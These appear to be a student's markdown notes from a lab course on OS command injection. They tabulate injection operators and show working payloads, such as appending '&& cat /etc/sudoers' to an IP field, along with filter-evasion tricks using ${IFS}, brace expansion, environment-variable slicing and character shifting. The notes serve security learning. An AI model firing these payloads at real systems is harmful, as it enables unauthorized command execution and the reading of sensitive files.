### Injection Chars
|   |   |   |   |
|---|---|---|---|
|New Line|`\n`|`%0a`|Both|
|Background|`&`|`%26`|Both (second output generally shown first)|
|Pipe|`\|`|`%7c`|Both (only second output is shown)|
|AND|`&&`|`%26%26`|Both (only if first succeeds)|
|OR|`\|`|`%7c%7c`|Second (only if first fails)|
|Sub-Shell|` `` `|`%60%60`|Both (Linux-only)|
|Sub-Shell|`$()`|`%24%28%29`|Both (Linux-only)|

### Injection operators
|**Injection Type**|**Operators**|
|---|---|
|SQL Injection|`'` `,` `;` `--` `/* */`|
|Command Injection|`;` `&&`|
|LDAP Injection|`*` `(` `)` `&` `\|`|
|XPath Injection|`'` `or` `and` `not` `substring` `concat` `count`|
|OS Command Injection|`;` `&` `\|`|
|Code Injection|`'` `;` `--` `/* */` `$()` `${}` `#{}` `%{}` `^`|
|Directory Traversal/File Path Traversal|`../` `..\\` `%00`|
|Object Injection|`;` `&` `\|`|
|XQuery Injection|`'` `;` `--` `/* */`|
|Shellcode Injection|`\x` `\u` `%u` `%n`|
|Header Injection|`\n` `\r\n` `\t` `%0d` `%0a` `%09`|

* ### Command injection basics
	* you append these characters to the input string to execute your command
		* example (site that pings a given ip addr takes ip as input string, we can append the && char to execute our command): 
			* `127.0.0.1 && cat /etc/sudoers`
### Example site observations
* The input field of a HTML form can be regexed
	*  the pattern in this site is
```r
^((\d{1,2}|1\d\d|2[0-4]\d|25[0-5])\.){3}(\d{1,2}|1\d\d|2[0-4]\d|25[0-5])$
```
* this matches for ip addresses by looking for numbers
	* ##### this could be bypassed by URL encoding a injection char
		* eg: `ip=127.0.0.1+%26%26+whoami`
			* (`127.0.0.1 && whoami`)

### Interesting quirks
* #### OR 
	*  `||` < The Linux OR command only runs if the  second command if the first command fails
	* ###### If you can deliberately break the first command that uses your user provided string (eg: not providing a valid ip addr) you can get our command to run
		* in:
			* `ping -c 1 || whoami`
		* out:
			* `ping: usage error: Destination address required \n root`
		* this is called a Injection operator [[Command Injection#Injection operators]]
			* basically just a multi char version of a injectable char
* #### \\n
	* the new line character is usually not blocked by WAFS or client side detection
		* it might be needed in the payload
	* it can be used as a injection operator
### Identifying Filters
* WAFS
	* sometimes devs may outsource form validation to another company like Cloudflare
	* they use WAFS to do this
	* If the error message from your injection req is displayed on a different page, with information like our IP and our request, this may indicate that it was denied by a WAF
	* Below is some example code a WAF could use
```php
$blacklist = ['&', '|', ';', ...SNIP...];
foreach ($blacklist as $character) {
    if (strpos($_POST['ip'], $character) !== false) {
        echo "Invalid input";
    }
}
```

### Bypass blocked operators/chars
* ### Space
	* space is usually blacklisted especially if the input should not contain any spaces
	* its used to define arguments so we prob need it
	* #### Tabs
		* Using tabs (%09) instead of spaces is a technique that may work, as both Linux and Windows accept commands with tabs between arguments.
	* #### ($IFS) Linux Environment Variable
		* default value for IFS is space
		* this can be used in place of space like this:
			* `127.0.0.1%0a${IFS}`
			* `use ${IFS} where the spaces should be`
	* #### Brace Expansion
		* Linux automatically adds spaces between args wrapped in braces
			* `127.0.0.1%0a{ls,-la}`
	* https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection#bypass-without-space
* ### Using Env Variables to get passable chars
* #### Linux
	* Linux Env variables can potentially contain illegal chars for example in the  `${PATH}`  var displayed below it contains /
		* ` /usr/local/bin:/usr/bin:/bin:/usr/games`
		* `/\ This "/" char is illegal`
	* We can use the index of this string to get our illegal char
```bash
becker63@htb[/htb]$ echo ${LS_COLORS:10:1}
;
```

* #### Windows
* CMD
	* "The same concept work on Windows as well. For example, to produce a slash in `Windows Command Line (CMD)`, we can `echo` a Windows variable (`%HOMEPATH%` -> `\Users\htb-student`), and then specify a starting position (`~6` -> `\htb-student`), and finally specifying a negative end position, which in this case is the length of the username `htb-student` (`-11` -> `\`) "
```cmd-session
C:\htb> echo %HOMEPATH:~6,-11%
\
```

* PowerShell
	*  With PowerShell, a word is considered an array
	* just have to specify the index of the character we need
```powershell
PS C:\htb> $env:HOMEPATH[0]
\
```

* ### Char shifting
	* "There are other techniques to produce the required characters without using them, like `shifting characters`. For example, the following Linux command shifts the character we pass by `1`. So, all we have to do is find the character in the ASCII table that is just before our needed character (we can get it with `man ascii`), then add it instead of `[` in the below example. This way, the last printed character would be the one we need"
```shell
becker63@htb[/htb]$ man ascii     # \ is on 92, before it is [ on 91
becker63@htb[/htb]$ echo $(tr '!-}' '"-~'<<<[)
\
```

### Putting [[Command Injection#Bypass blocked operators/chars]] together
* list the contents of "home"
```
ip=127.0.0.1%0a{ls,-la}${IFS}${PATH:0:1}home
            /\          /\        /\   
         New line      Space     "/"char 
```
```shell
\/ full command
ls -la /home
```
